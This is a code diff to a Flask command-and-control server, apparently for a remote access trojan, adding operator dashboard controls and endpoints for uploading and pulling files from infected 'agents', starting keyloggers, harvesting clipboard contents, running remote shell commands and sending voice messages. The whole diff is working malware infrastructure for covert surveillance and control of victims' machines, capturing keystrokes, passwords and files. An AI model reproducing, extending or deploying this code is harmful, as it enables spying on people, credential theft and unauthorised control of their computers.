@@ -1,8 +1,11 @@
-from flask import Flask, request, jsonify, redirect, url_for, Response
+from flask import Flask, request, jsonify, redirect, url_for, Response, send_file
 from collections import defaultdict
 import datetime
 import time
 import queue
+import os
+import base64
+import tempfile
 
 app = Flask(__name__)
 
@@ -65,6 +68,40 @@ DASHBOARD_HTML = """
         <button onclick="startCameraStream()">Start Webcam Stream</button>
         <button onclick="stopAllStreams()">Stop All Streams</button>
         
+        <h2>File Management</h2>
+        <div class="form-group">
+            <label for="file-upload">Upload File to Agent</label>
+            <input type="file" id="file-upload" style="margin-bottom: 10px;">
+            <input type="text" id="upload-path" placeholder="Destination path on agent (e.g., C:\\temp\\file.txt)">
+            <button onclick="uploadFile()" style="margin-top: 10px;">Upload File</button>
+        </div>
+        <div class="form-group" style="margin-top: 15px;">
+            <label for="download-path">Download File from Agent</label>
+            <input type="text" id="download-path" placeholder="File path on agent (e.g., C:\\temp\\file.txt)">
+            <button onclick="downloadFile()" style="margin-top: 10px;">Download File</button>
+        </div>
+
+        <h2>Monitoring</h2>
+        <button onclick="startKeylogger()">Start Keylogger</button>
+        <button onclick="stopKeylogger()">Stop Keylogger</button>
+        <button onclick="getKeylogData()">Get Keylog Data</button>
+        <button onclick="startClipboardMonitor()">Start Clipboard Monitor</button>
+        <button onclick="stopClipboardMonitor()">Stop Clipboard Monitor</button>
+        <button onclick="getClipboardData()">Get Clipboard Data</button>
+
+        <h2>Remote Shell</h2>
+        <div class="form-group">
+            <label for="shell-command">Shell Command</label>
+            <input type="text" id="shell-command" placeholder="Enter command..." onkeypress="handleShellEnter(event)">
+            <button onclick="sendShellCommand()">Send</button>
+            <button onclick="clearShellOutput()">Clear</button>
+        </div>
+        <pre id="shell-output" style="background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; min-height: 200px; max-height: 400px; overflow-y: auto;">Remote shell output will appear here...</pre>
+
+        <h2>Voice Communication</h2>
+        <button id="voice-btn" onclick="toggleVoiceRecording()">Start Voice Recording</button>
+        <div id="voice-status" class="status" style="display:none;"></div>
+
         <h2>Process Management</h2>
         <button onclick="listProcesses()">List Running Processes</button>
         <div class="form-group" style="margin-top: 15px;">
@@ -340,6 +377,262 @@ DASHBOARD_HTML = """
             }
         }
 
+        // File Management Functions
+        async function uploadFile() {
+            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
+            
+            const fileInput = document.getElementById('file-upload');
+            const pathInput = document.getElementById('upload-path');
+            
+            if (!fileInput.files[0]) { alert('Please select a file to upload.'); return; }
+            if (!pathInput.value) { alert('Please specify destination path.'); return; }
+            
+            const file = fileInput.files[0];
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('agent_id', selectedAgentId);
+            formData.append('destination_path', pathInput.value);
+            
+            try {
+                const response = await fetch('/upload_file', {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                
+                if (response.ok) {
+                    alert('File upload initiated successfully!');
+                    fileInput.value = '';
+                    pathInput.value = '';
+                } else {
+                    alert(`Upload failed: ${result.message}`);
+                }
+            } catch (error) {
+                alert('Network error during file upload.');
+                console.error('Upload error:', error);
+            }
+        }
+
+        async function downloadFile() {
+            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
+            
+            const pathInput = document.getElementById('download-path');
+            if (!pathInput.value) { alert('Please specify file path to download.'); return; }
+            
+            try {
+                const response = await fetch('/download_file', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        agent_id: selectedAgentId, 
+                        file_path: pathInput.value 
+                    })
+                });
+                
+                if (response.ok) {
+                    const blob = await response.blob();
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = pathInput.value.split('\\').pop().split('/').pop();
+                    document.body.appendChild(a);
+                    a.click();
+                    window.URL.revokeObjectURL(url);
+                    document.body.removeChild(a);
+                    pathInput.value = '';
+                } else {
+                    const result = await response.json();
+                    alert(`Download failed: ${result.message}`);
+                }
+            } catch (error) {
+                alert('Network error during file download.');
+                console.error('Download error:', error);
+            }
+        }
+
+        // Monitoring Functions
+        function startKeylogger() {
+            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
+            issueCommandInternal(selectedAgentId, 'start-keylogger');
+            alert('Keylogger started on agent.');
+        }
+
+        function stopKeylogger() {
+            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
+            issueCommandInternal(selectedAgentId, 'stop-keylogger');
+            alert('Keylogger stopped on agent.');
+        }
+
+        async function getKeylogData() {
+            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
+            
+            try {
+                const response = await fetch(`/get_keylog_data/${selectedAgentId}`);
+                const result = await response.json();
+                
+                if (response.ok && result.data) {
+                    document.getElementById('output-display').textContent = 'KEYLOG DATA:\n' + result.data;
+                } else {
+                    document.getElementById('output-display').textContent = 'No keylog data available.';
+                }
+            } catch (error) {
+                console.error('Error getting keylog data:', error);
+            }
+        }
+
+        function startClipboardMonitor() {
+            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
+            issueCommandInternal(selectedAgentId, 'start-clipboard');
+            alert('Clipboard monitoring started on agent.');
+        }
+
+        function stopClipboardMonitor() {
+            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
+            issueCommandInternal(selectedAgentId, 'stop-clipboard');
+            alert('Clipboard monitoring stopped on agent.');
+        }
+
+        async function getClipboardData() {
+            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
+            
+            try {
+                const response = await fetch(`/get_clipboard_data/${selectedAgentId}`);
+                const result = await response.json();
+                
+                if (response.ok && result.data) {
+                    document.getElementById('output-display').textContent = 'CLIPBOARD DATA:\n' + result.data;
+                } else {
+                    document.getElementById('output-display').textContent = 'No clipboard data available.';
+                }
+            } catch (error) {
+                console.error('Error getting clipboard data:', error);
+            }
+        }
+
+        // Remote Shell Functions
+        function handleShellEnter(event) {
+            if (event.key === 'Enter') {
+                sendShellCommand();
+            }
+        }
+
+        async function sendShellCommand() {
+            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
+            
+            const commandInput = document.getElementById('shell-command');
+            const command = commandInput.value.trim();
+            
+            if (!command) return;
+            
+            const shellOutput = document.getElementById('shell-output');
+            shellOutput.textContent += `> ${command}\n`;
+            
+            try {
+                const response = await fetch('/shell_command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        agent_id: selectedAgentId, 
+                        command: command 
+                    })
+                });
+                const result = await response.json();
+                
+                if (response.ok) {
+                    shellOutput.textContent += result.output + '\n';
+                } else {
+                    shellOutput.textContent += `Error: ${result.message}\n`;
+                }
+                
+                shellOutput.scrollTop = shellOutput.scrollHeight;
+                commandInput.value = '';
+            } catch (error) {
+                shellOutput.textContent += 'Network error executing command.\n';
+                console.error('Shell command error:', error);
+            }
+        }
+
+        function clearShellOutput() {
+            document.getElementById('shell-output').textContent = 'Remote shell output will appear here...';
+        }
+
+        // Voice Communication Functions
+        let mediaRecorder;
+        let audioChunks = [];
+        let isRecording = false;
+
+        async function toggleVoiceRecording() {
+            const voiceBtn = document.getElementById('voice-btn');
+            const voiceStatus = document.getElementById('voice-status');
+            
+            if (!isRecording) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    mediaRecorder = new MediaRecorder(stream);
+                    audioChunks = [];
+                    
+                    mediaRecorder.ondataavailable = event => {
+                        audioChunks.push(event.data);
+                    };
+                    
+                    mediaRecorder.onstop = async () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                        await sendVoiceToAgent(audioBlob);
+                    };
+                    
+                    mediaRecorder.start();
+                    isRecording = true;
+                    voiceBtn.textContent = 'Stop Voice Recording';
+                    voiceStatus.style.display = 'block';
+                    voiceStatus.className = 'status success';
+                    voiceStatus.textContent = 'Recording... Click stop when finished.';
+                } catch (error) {
+                    voiceStatus.style.display = 'block';
+                    voiceStatus.className = 'status error';
+                    voiceStatus.textContent = 'Error accessing microphone.';
+                    console.error('Voice recording error:', error);
+                }
+            } else {
+                mediaRecorder.stop();
+                mediaRecorder.stream.getTracks().forEach(track => track.stop());
+                isRecording = false;
+                voiceBtn.textContent = 'Start Voice Recording';
+                voiceStatus.style.display = 'none';
+            }
+        }
+
+        async function sendVoiceToAgent(audioBlob) {
+            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
+            
+            const formData = new FormData();
+            formData.append('audio', audioBlob, 'voice.wav');
+            formData.append('agent_id', selectedAgentId);
+            
+            try {
+                const response = await fetch('/send_voice', {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                
+                const voiceStatus = document.getElementById('voice-status');
+                voiceStatus.style.display = 'block';
+                if (response.ok) {
+                    voiceStatus.className = 'status success';
+                    voiceStatus.textContent = 'Voice message sent to agent successfully!';
+                } else {
+                    voiceStatus.className = 'status error';
+                    voiceStatus.textContent = `Failed to send voice: ${result.message}`;
+                }
+                
+                setTimeout(() => {
+                    voiceStatus.style.display = 'none';
+                }, 3000);
+            } catch (error) {
+                console.error('Error sending voice:', error);
+            }
+        }
+
 
 
         // Auto-refresh agents every 5 seconds
@@ -358,6 +651,9 @@ AGENTS_DATA = defaultdict(lambda: {"commands": [], "output": [], "last_seen": No
 VIDEO_FRAMES = defaultdict(lambda: None)
 CAMERA_FRAMES = defaultdict(lambda: None)
 AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())
+KEYLOG_DATA = defaultdict(lambda: [])
+CLIPBOARD_DATA = defaultdict(lambda: [])
+VOICE_COMMANDS = defaultdict(lambda: queue.Queue())
 # --- Operator-facing endpoints ---
 
 @app.route("/")
@@ -497,6 +793,172 @@ def get_agents():
     Lists all agents that have checked in and their last seen time.
     """
     return jsonify(AGENTS_DATA)
+
+# --- File Management Endpoints ---
+
+@app.route("/upload_file", methods=["POST"])
+def upload_file():
+    """Upload a file to be sent to an agent."""
+    if 'file' not in request.files:
+        return jsonify({"status": "error", "message": "No file provided"}), 400
+    
+    file = request.files['file']
+    agent_id = request.form.get('agent_id')
+    destination_path = request.form.get('destination_path')
+    
+    if not agent_id or not destination_path:
+        return jsonify({"status": "error", "message": "agent_id and destination_path required"}), 400
+    
+    # Read file content and encode as base64
+    file_content = base64.b64encode(file.read()).decode('utf-8')
+    
+    # Queue the upload command for the agent
+    upload_command = f"upload-file:{destination_path}:{file_content}"
+    AGENTS_DATA[agent_id]["commands"].append(upload_command)
+    
+    return jsonify({"status": "success", "message": "File upload queued for agent"})
+
+@app.route("/download_file", methods=["POST"])
+def download_file():
+    """Request a file download from an agent."""
+    data = request.json
+    agent_id = data.get("agent_id")
+    file_path = data.get("file_path")
+    
+    if not agent_id or not file_path:
+        return jsonify({"status": "error", "message": "agent_id and file_path required"}), 400
+    
+    # Queue the download command for the agent
+    download_command = f"download-file:{file_path}"
+    AGENTS_DATA[agent_id]["commands"].append(download_command)
+    
+    # Wait for the file to be uploaded by the agent (simple polling approach)
+    # In a production system, you'd want a more sophisticated mechanism
+    import time
+    for _ in range(30):  # Wait up to 30 seconds
+        time.sleep(1)
+        # Check if agent has uploaded the file
+        temp_file_path = f"/tmp/download_{agent_id}_{os.path.basename(file_path)}"
+        if os.path.exists(temp_file_path):
+            return send_file(temp_file_path, as_attachment=True, download_name=os.path.basename(file_path))
+    
+    return jsonify({"status": "error", "message": "File download timeout"}), 408
+
+@app.route("/file_upload/<agent_id>", methods=["POST"])
+def receive_file_from_agent(agent_id):
+    """Receive a file uploaded by an agent."""
+    data = request.json
+    filename = data.get("filename")
+    file_content_b64 = data.get("content")
+    
+    if not filename or not file_content_b64:
+        return jsonify({"status": "error", "message": "filename and content required"}), 400
+    
+    try:
+        # Decode base64 content
+        file_content = base64.b64decode(file_content_b64)
+        
+        # Save to temporary file
+        temp_file_path = f"/tmp/download_{agent_id}_{filename}"
+        with open(temp_file_path, 'wb') as f:
+            f.write(file_content)
+        
+        return jsonify({"status": "success"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+# --- Monitoring Endpoints ---
+
+@app.route("/keylog_data/<agent_id>", methods=["POST"])
+def receive_keylog_data(agent_id):
+    """Receive keylog data from an agent."""
+    data = request.json
+    keylog_entry = data.get("data")
+    
+    if keylog_entry:
+        KEYLOG_DATA[agent_id].append(keylog_entry)
+    
+    return jsonify({"status": "received"})
+
+@app.route("/get_keylog_data/<agent_id>", methods=["GET"])
+def get_keylog_data(agent_id):
+    """Get accumulated keylog data for an agent."""
+    data = KEYLOG_DATA[agent_id]
+    KEYLOG_DATA[agent_id] = []  # Clear after retrieval
+    return jsonify({"data": "\n".join(data)})
+
+@app.route("/clipboard_data/<agent_id>", methods=["POST"])
+def receive_clipboard_data(agent_id):
+    """Receive clipboard data from an agent."""
+    data = request.json
+    clipboard_entry = data.get("data")
+    
+    if clipboard_entry:
+        CLIPBOARD_DATA[agent_id].append(clipboard_entry)
+    
+    return jsonify({"status": "received"})
+
+@app.route("/get_clipboard_data/<agent_id>", methods=["GET"])
+def get_clipboard_data(agent_id):
+    """Get accumulated clipboard data for an agent."""
+    data = CLIPBOARD_DATA[agent_id]
+    CLIPBOARD_DATA[agent_id] = []  # Clear after retrieval
+    return jsonify({"data": "\n".join(data)})
+
+# --- Shell and Voice Endpoints ---
+
+@app.route("/shell_command", methods=["POST"])
+def shell_command():
+    """Execute a shell command and return immediate response."""
+    data = request.json
+    agent_id = data.get("agent_id")
+    command = data.get("command")
+    
+    if not agent_id or not command:
+        return jsonify({"status": "error", "message": "agent_id and command required"}), 400
+    
+    # Queue the command
+    AGENTS_DATA[agent_id]["commands"].append(command)
+    
+    # Wait for response (simplified approach)
+    import time
+    for _ in range(10):  # Wait up to 10 seconds
+        time.sleep(1)
+        output_list = AGENTS_DATA[agent_id]["output"]
+        if output_list:
+            output = output_list.pop(0)
+            return jsonify({"output": output})
+    
+    return jsonify({"output": "Command timeout or no response"})
+
+@app.route("/send_voice", methods=["POST"])
+def send_voice():
+    """Send voice command to agent."""
+    if 'audio' not in request.files:
+        return jsonify({"status": "error", "message": "No audio file provided"}), 400
+    
+    audio_file = request.files['audio']
+    agent_id = request.form.get('agent_id')
+    
+    if not agent_id:
+        return jsonify({"status": "error", "message": "agent_id required"}), 400
+    
+    # Save audio file temporarily
+    temp_audio_path = f"/tmp/voice_{agent_id}_{int(time.time())}.wav"
+    audio_file.save(temp_audio_path)
+    
+    # Read and encode audio
+    with open(temp_audio_path, 'rb') as f:
+        audio_content = base64.b64encode(f.read()).decode('utf-8')
+    
+    # Queue voice command for agent
+    voice_command = f"play-voice:{audio_content}"
+    AGENTS_DATA[agent_id]["commands"].append(voice_command)
+    
+    # Clean up temp file
+    os.unlink(temp_audio_path)
+    
+    return jsonify({"status": "success", "message": "Voice command sent to agent"})
 
 # --- Agent-facing endpoints ---
 
